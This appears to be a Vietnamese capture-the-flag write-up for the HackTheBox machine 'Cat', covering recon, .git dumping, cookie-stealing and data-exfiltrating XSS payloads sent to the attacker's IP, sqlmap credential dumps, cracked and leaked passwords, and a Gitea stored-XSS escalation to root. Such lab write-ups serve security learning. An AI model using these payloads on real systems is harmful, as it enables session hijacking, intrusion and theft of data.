![image](https://hackmd.io/_uploads/Sk1agoEtye.png)

# Machine info and Comment
## Machine info
Đây là một máy đang active nên chưa có thông tin về máy này [Link](https://app.hackthebox.com/machines/646)

## Comment
Đang đau đầu còn phải đọc code, sai lệnh tùm lum, mất cụ ngày thứ 7 :))

# Recon
## nmap 
Scan xem các port hiện mở
```
┌──(kali㉿kali)-[~]
└─$ sudo nmap -n -sS 10.10.11.53                              
[sudo] password for kali: 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-08 04:01 EST
Nmap scan report for 10.10.11.53
Host is up (0.21s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 6.54 seconds
```
Đào sâu hơn
```
┌──(kali㉿kali)-[~]
└─$ sudo nmap -p22,80 -sCV 10.10.11.53
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-08 04:04 EST
Nmap scan report for 10.10.11.53 (10.10.11.53)
Host is up (0.21s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 96:2d:f5:c6:f6:9f:59:60:e5:65:85:ab:49:e4:76:14 (RSA)
|   256 9e:c4:a4:40:e9:da:cc:62:d1:d6:5a:2f:9e:7b:d4:aa (ECDSA)
|_  256 6e:22:2a:6a:6d:eb:de:19:b7:16:97:c2:7e:89:29:d5 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Did not follow redirect to http://cat.htb/
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 14.39 seconds
```
Add domain vào `/etc/hosts`
```
┌──(kali㉿kali)-[~]
└─$ echo "10.129.229.61 cat.htb" | sudo tee -a /etc/hosts
10.129.229.61 cat.htb
```

## Gobuster 
Để chắc chắn không có path nào bị ẩn có thể khai thác và có sự phân path rõ ràng khi bấm vào từng option, ta sẽ scan path:

![image](https://hackmd.io/_uploads/rkgSEjEKke.png)

![image](https://hackmd.io/_uploads/rJJvVjEt1l.png)

```
┌──(kali㉿kali)-[~]
└─$ gobuster dir -u http://cat.htb/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/quickhits.txt -b 403,404
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://cat.htb/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/quickhits.txt
[+] Negative Status codes:   403,404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.git                 (Status: 301) [Size: 301] [--> http://cat.htb/.git/]
/.git/config          (Status: 200) [Size: 92]
/.git/index           (Status: 200) [Size: 1726]
/.git/HEAD            (Status: 200) [Size: 23]
/.git/logs/HEAD       (Status: 200) [Size: 150]
/.git/logs/refs       (Status: 301) [Size: 311] [--> http://cat.htb/.git/logs/refs/]
/admin.php            (Status: 302) [Size: 1] [--> /join.php]
/config.php           (Status: 200) [Size: 1]
Progress: 2565 / 2566 (99.96%)
===============================================================
Finished
===============================================================
```

## git-dumper
Sử dụng `git-dumper` để dump thử file git về
```
git-dumper http://cat.htb/.git cathtb
```

![image](https://hackmd.io/_uploads/SkM2SiNt1l.png)

Ở đây ta thấy được 1 số path khác như `accept_cat.php`, `delete_cat.php`, `view_cat.php`

Bởi vì `/join.php` và `/contest.php` là nơi cho phép ta có thể inject vào nên ta sẽ chú ý hơn vào file này để tìm được lỗ hổng

![image](https://hackmd.io/_uploads/r1qI8iEFyg.png)

## view_cat.php
Khi đọc code ở file này ta thấy được user phải là `axel` thì mới có thể truy cập vào trang này, có thể đây là **admin** đồng thời đoạn code ở dưới có thể xảy ra lỗ hổng **SQLi** hoặc **XSS**.

![image](https://hackmd.io/_uploads/rypc_oNFkg.png)

Tương tự ở `accept_cat.php`

![image](https://hackmd.io/_uploads/ByDIRs4tke.png)

# User flag
## XSS
Từ bước Recon ở file [view_cat.php](#view_catphp) ở đoạn code trên ta  nghiêng về **XSS** nhiều hơn bởi vì ta chưa có quyền truy cập vào file này và có thể tận dụng lỗ hổng này để cướp phiên. bằng cách lợi dụng vào param `own_username`. Param này là nơi ta có thể inject vào.

![image](https://hackmd.io/_uploads/rJYf6jEFJg.png)

Payload 
```
<img src=x onerror="this.src='http://10.10.14.176:1234/cookie=' + document.cookie">
```

![image](https://hackmd.io/_uploads/SJ43x2VYke.png)

![image](https://hackmd.io/_uploads/Bk76enNYkx.png)

## SQLi
### sqlmap
Tiếp theo ta sẽ tấn công SQLi bằng sqlmap để có thể dump db của nó ra

```
┌──(kali㉿kali)-[~/Desktop]
└─$ sqlmap -r cat.txt -p catName --cookie="PHPSESSID=ggnmtbti8ompp6b6ovo4n59ghr" --dbms=SQLite --level=5 --risk=3 --tables

<current>
[4 tables]
+-----------------+
| accepted_cats   |
| cats            |
| sqlite_sequence |
| users           |
+-----------------+
```
Dump credential:

```
┌──(kali㉿kali)-[~/Desktop]
└─$ sqlmap -r cat.txt -p catName --cookie="PHPSESSID=pp7pvtkqqg3uilcb8ua7k35hec" --dbms=SQLite --level=5 --risk=3 -T users --dump

+---------+-------------------------------+----------------------------------+----------+
| user_id | email                         | password                         |username |
+---------+-------------------------------+----------------------------------+----------+
|1| axel2017@gmail.com            | d1bbba3670feb9435c9841e46e60ee2f |axel     |
|2| rosamendoza485@gmail.com      | ac369922d560f17d6eeb8b2c7dec498c |rosa     |
|3| robertcervantes2000@gmail.com |42846631708f69c00ec0c0a8aa4a92ad |robert   |
|4| fabiancarachure2323@gmail.com |39e153e825c4a3d314a0dc7f7475ddbe |fabian   |
|5| jerrysonC343@gmail.com        |781593e060f8d065cd7281c5ec5b4b86 |jerryson |
|<blank>| larryP5668C?????????          |<blank>|<blank>|
|<blank>|<blank>|<blank>|<blank>|
|<blank>|<blank>|<blank>|<blank>|
|<blank>|<blank>|<blank>|<blank>|
|<blank>|<blank>|<blank>|<blank>|
|<blank>|<blank>|<blank>|<blank>|
+---------+-------------------------------+----------------------------------+----------+
```

### crackstation
Sử dụng [crackstation](https://crackstation.net/) để crack password. Ta được credential của user `rosa`

![image](https://hackmd.io/_uploads/ByESGp4Yke.png)

## Lateral Movement
SSH với credential `rosa:soyunaprincesarosa`

![image](https://hackmd.io/_uploads/HJDgmTEYkx.png)

Mục tiêu của chúng ta sẽ tìm cách mò được credential của `axel`. Một trong số cách là xem được liệu hệ thống có lưu "log" về việc login của user này không

### /var/log/apache2 
Credential: `axel:aNdZwgC4tI9gnVXv_e3Q`

![image](https://hackmd.io/_uploads/H1Q07TEYJx.png)

SSH lại và lấy được user flag

```
axel@cat:~$ cat user.txt 
dd95e0fc58671d453b9f*****
```

# Root flag
Điều rất lỏ ở đây là chi tiết nhận được mail lúc ssh vào, và khi nhận được hint thì mình mới biết đã bỏ qua =))

![image](https://hackmd.io/_uploads/rJonzGBF1x.png)

Nội dung mail:

![image](https://hackmd.io/_uploads/ryPXXMrYJl.png)

Chú ý ở phần cuối sẽ thấy rằng có kết nối ở port 3000

![image](https://hackmd.io/_uploads/ByWcQzStkl.png)

## SSH Tunneling
```
┌──(kali㉿kali)-[~/Desktop]
└─$ ssh -L 3000:127.0.0.1:3000 axel@10.10.11.53
axel@10.10.11.53's password: 
```

![image](https://hackmd.io/_uploads/H1959MrFkx.png)

Check version sẽ thấy nó có 1 CVE về Stored XSS và cách [exploit](https://www.exploit-db.com/exploits/52077) 

![image](https://hackmd.io/_uploads/BJr3qMrtJe.png)

![image](https://hackmd.io/_uploads/By6giMSYkg.png)

Login với credential `axel:aNdZwgC4tI9gnVXv_e3Q` sau đó taọ 1 repo theo cách exploit và thành công

![image](https://hackmd.io/_uploads/SkXnszSKyl.png)

![image](https://hackmd.io/_uploads/SyRvnMrt1l.png)

Tiếp theo ta sẽ nhắm đến mục `README.md` vì mục này không cần click cũng sẽ tự động chạy script (và mail cũng có nói)

![image](https://hackmd.io/_uploads/S1oMTfSYkg.png)

```
<a href="javascript:fetch('http://localhost:3000/administrator/Employee-management/raw/branch/main/index.php').then(response --> response.text()).then(data --> fetch('http://10.10.14.176:4444/?response=' +encodeURIComponent(data))).catch(error -->  console.error('Error:', error));">XSS test</a>
```

## swaks
> swaks là một công cụ dòng lệnh dùng để gửi email qua giao thức SMTP. Nó hỗ trợ nhiều phương thức xác thực, mã hóa và có thể gửi email trực tiếp từ terminal.

Sau đó ta sẽ gửi mail cho `jobert` với lệnh sau
```
swaks --to "jobert@localhost" --from "axel@localhost" --header "Subject: seg" --body "http://localhost:3000/axel/xss" --server localhost --port 2525
```

![image](https://hackmd.io/_uploads/B19Mx7HYJx.png)

## Cyberchef
Decode trên Cyberchef

![image](https://hackmd.io/_uploads/ByO3k7HYJg.png)

Từ đây switch user sang root và lấy root flag 

```
root@cat:~# cat root.txt 
9c41314c1e4a4c6ca70*********
```

------------------------------------------ Cat has been Pwned! ------------------------------------------
![image](https://hackmd.io/_uploads/Hkeyp-SYyl.png)




